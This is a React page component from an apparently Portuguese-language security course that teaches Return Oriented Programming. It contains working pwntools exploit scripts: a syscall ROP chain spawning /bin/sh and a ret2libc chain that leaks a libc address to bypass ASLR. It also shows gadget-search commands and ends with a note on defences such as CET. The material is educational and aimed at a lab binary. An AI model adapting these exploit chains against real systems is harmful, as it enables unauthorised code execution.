import { PageContainer } from "@/components/layout/PageContainer";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { AlertBox } from "@/components/ui/AlertBox";

export default function ROP() {
  return (
    <PageContainer title="Return Oriented Programming" subtitle="Bypassando NX/DEP com cadeias de gadgets existentes" difficulty="expert" timeToRead="25 min">
      <AlertBox type="danger" title="Uso Educacional">
        ROP é uma técnica de pesquisa de segurança. Use apenas em CTF, labs e ambientes autorizados.
      </AlertBox>

      <p><strong>Return Oriented Programming (ROP)</strong> é uma técnica que permite executar código arbitrário mesmo com proteção NX (stack não executável). Em vez de injetar shellcode, encadeia pequenos trechos de código existente chamados <strong>gadgets</strong>.</p>

      <h2>O que são Gadgets?</h2>
      <CodeBlock language="bash" code={`# Gadget = sequência de instruções terminada em RET
# Exemplos de gadgets úteis:
#   pop rdi; ret              — carregar argumento 1
#   pop rsi; ret              — carregar argumento 2
#   pop rdx; ret              — carregar argumento 3
#   mov rax, rdi; ret         — mover registrador
#   syscall; ret              — executar syscall
#   /bin/sh em .data          — string para execve

# O atacante sobrescreve o endereço de retorno com o endereço do primeiro gadget
# Cada gadget termina em RET, que "retorna" para o próximo gadget (na stack)
# Assim, a execução "pula" de gadget em gadget — ROP chain!`} />

      <h2>Procurando Gadgets</h2>
      <CodeBlock language="bash" code={`# ROPgadget — ferramenta para encontrar gadgets:
pip install ropgadget
ROPgadget --binary ./vuln --rop          # todos os gadgets
ROPgadget --binary ./vuln --string "/bin/sh"  # procura string
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --rop | grep "pop rdi"

# Exemplos de procura:
ROPgadget --binary vuln --rop | grep "pop rdi ; ret"
# 0x00000000004012cb : pop rdi ; ret

ROPgadget --binary vuln --rop | grep "syscall"
# 0x0000000000400a85 : syscall ; ret

# Ropper (alternativa):
pip install ropper
ropper --file ./vuln --search "pop rdi"

# pwntools tem rop automático:
# rop = ROP(elf)
# rop.call(elf.plt['puts'], [elf.got['puts']])`} />

      <h2>ROP Chain Simples</h2>
      <CodeBlock language="python" filename="rop_chain.py" code={`#!/usr/bin/env python3
# Exploit ROP: execve("/bin/sh", NULL, NULL)
# Usando syscall direta — precisa dos gadgets certos!
from pwn import *

context.arch = 'amd64'
elf = ELF('./vuln')

# Endereços dos gadgets (encontrados com ROPgadget):
pop_rdi  = 0x4012cb   # pop rdi; ret
pop_rsi  = 0x4012cd   # pop rsi; ret
pop_rdx  = 0x4012cf   # pop rdx; ret
pop_rax  = 0x4012d1   # pop rax; ret
syscall  = 0x400a85   # syscall; ret
bin_sh   = 0x601060   # endereço de "/bin/sh" no binário (ou em libc)

# Offset até o endereço de retorno:
offset = 72

# Construir ROP chain:
rop_chain  = b'A' * offset          # padding
rop_chain += p64(pop_rdi)           # pop rdi; ret
rop_chain += p64(bin_sh)            #   rdi = &"/bin/sh"
rop_chain += p64(pop_rsi)           # pop rsi; ret
rop_chain += p64(0)                 #   rsi = NULL
rop_chain += p64(pop_rdx)           # pop rdx; ret
rop_chain += p64(0)                 #   rdx = NULL
rop_chain += p64(pop_rax)           # pop rax; ret
rop_chain += p64(59)                #   rax = 59 (execve)
rop_chain += p64(syscall)           # syscall

print(f"ROP chain length: {len(rop_chain)}")

p = process('./vuln')
p.sendline(rop_chain)
p.interactive()`} />

      <h2>ret2libc — Usando Funções da libc</h2>
      <CodeBlock language="python" filename="ret2libc.py" code={`# ret2libc: chamar system("/bin/sh") da libc
# Não precisa de syscall gadget — usa função C da libc

from pwn import *

elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./vuln')

# Com ASLR, precisamos vazar um endereço da libc primeiro:
# 1. Usar puts@plt para imprimir puts@got (vaza endereço real de puts)
# 2. Calcular base da libc: base = puts_leaked - libc.symbols['puts']
# 3. Calcular endereços reais de system e /bin/sh

# Gadgets:
pop_rdi = next(elf.search(asm('pop rdi; ret')))
ret_gadget = next(elf.search(asm('ret')))  # para alinhamento

# Fase 1: leak do puts:
payload1  = b'A' * 72
payload1 += p64(pop_rdi) + p64(elf.got['puts'])  # arg: &puts_got
payload1 += p64(elf.plt['puts'])                  # call puts
payload1 += p64(elf.symbols['main'])              # retornar ao main

p.sendline(payload1)
puts_leaked = u64(p.recv(6).ljust(8, b'\\x00'))
libc.address = puts_leaked - libc.symbols['puts']
print(f"[*] libc base: {hex(libc.address)}")

# Fase 2: chamar system("/bin/sh"):
bin_sh = next(libc.search(b'/bin/sh'))
payload2  = b'A' * 72
payload2 += p64(ret_gadget)   # alinhamento de 16 bytes para stack
payload2 += p64(pop_rdi) + p64(bin_sh)
payload2 += p64(libc.symbols['system'])

p.sendline(payload2)
p.interactive()`} />

      <AlertBox type="info" title="Defesas contra ROP">
        Control Flow Integrity (CFI), Shadow Stack (Intel CET), ASLR e PIE dificultam ROP. A Intel introduziu o CET (Control-flow Enforcement Technology) nos processadores Tiger Lake, que usa hardware para verificar que RET sempre retorna para um endereço de CALL legítimo.
      </AlertBox>
    </PageContainer>
  );
}
